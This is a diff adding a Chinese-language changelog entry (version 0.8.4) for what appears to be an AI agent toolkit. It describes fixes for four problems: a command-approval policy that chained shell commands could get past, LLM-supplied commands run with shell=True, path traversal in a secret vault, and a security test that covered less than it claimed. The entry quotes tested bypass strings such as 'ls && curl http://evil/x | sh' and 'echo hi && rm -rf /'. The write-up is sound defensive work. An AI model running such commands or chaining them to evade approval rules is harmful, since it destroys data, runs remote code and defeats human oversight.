@@ -4,6 +4,42 @@
 
 格式遵循 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.0.0/)。
 
+## [0.8.4] - 2026-10-23
+
+本轮是一次安全加固 + 版本口径统一，不改任何审查规则的行为，存量结论不受影响。
+
+### 修复（安全）
+- **审批策略被命令链绕过**（`approval_policy.py`）：规则对整串做 `fnmatch`，而 allow 规则多为前缀通配
+  （`echo*` / `ls*` / `cat*`），因此 `echo hi && rm -rf /` 整串命中 allow 被判 benign，deny 规则匹配不到整串；
+  而执行侧是 shell，`&&` 之后确实会跑。实测同类绕过：`ls && curl http://evil/x | sh`、
+  `git status && shutdown -h now`、`echo $(rm -rf /)`、`cat /etc/passwd && rm -rf /` 全部放行。
+  现按 `&&` / `||` / `;` / `|` / `&` / 换行 / `$()` / 反引号切成子命令（引号内的分隔符属字面量，不切），
+  **整串与逐段都判，取最严**（deny > ask > default > allow）。单命令走原路径，行为与修改前一致。
+- **两处真实 `shell=True`**：`agents/code/code-runloop/tools.py`（命令串来自 LLM 工具参数）、
+  `lab/debug_orchestrator.py`（测试命令来自调用方）。均改为参数列表 `shell=False`，
+  用 `shlex.split(posix=False)` 保留 Windows 反斜杠路径；含 shell 元字符时明确拒绝并给出理由，
+  不再静默当字面量传参造成"假执行"。
+- **密钥名路径穿越**（`agents/secrets/secret-vault/main.py`）：原来只替换 `os.sep`，Windows 上名里的 `/`
+  不被替换，`os.path.join` 会顺着 `/` 逃出 vault 目录；绝对路径可直接覆盖 vault_dir。现统一处理
+  `/`、`\`、NUL，并加 realpath 兜底；`_load` 改用 `with open`，不再泄漏文件句柄。
+- **安全测试白名单冒充全仓**（`tests/test_security_hardening.py`）：`test_no_shell_true_in_subprocess_calls`
+  原是 7 个文件的硬编码白名单却宣称"全仓"，上面两处 `shell=True` 正因在名单外而长期没被发现。
+  现改为递归扫全仓（排除 `.git` / `tests` 等），并补上 `check_call` 口径。
+
+### 修复（工具链）
+- **代码宪法门存量台账永远读不到**（`scripts/constitution_gate_changed.py`）：脚本用 `io.open` 却没有
+  `import io`，`NameError` 被 `except` 吞掉，`load_baseline()` 恒返回空，导致 `waived` 恒为 0、
+  所有存量越限都被当成"本次新引入"报红。改用内置 `open` 后存量正确识别（22 条）。
+
+### 变更（版本口径统一）
+- 顶层版本 `0.8.3` → `0.8.4`，`version.py` / README 正文 / README 徽标 / 本文件顶部条目四处一致。
+- 四个原子的 `main.py` 版本号与 `manifest.json` 对齐（`describe()` 上报的就是 `main.py` 的 `version`，
+  原先上报值偏低）：`guard` 0.1.0→0.2.0、`dep-scan` 0.1.0→0.2.0、`code-fuzz` 0.1.0→0.2.0、
+  `process-sandbox` 0.2.0→0.3.0。均以 manifest 为准——manifest 与 `registry.json` 本来就一致，
+  且 `provides` 声明的能力在代码里全部真实实现。
+- 新增 `tests/test_version_consistency.py`：把上述口径变成断言（顶层四处一致 + 每个原子
+  `main.py` 与 `manifest.json` 一致），以后漂了 CI 直接红，不再靠人肉同步。
+
 ## [0.8.3] - 2026-10-16
 
 本次把本地母体 2026-10-15 的一轮重构同步进开源树：口径统一 + 复杂度收口 + 一处真修复。
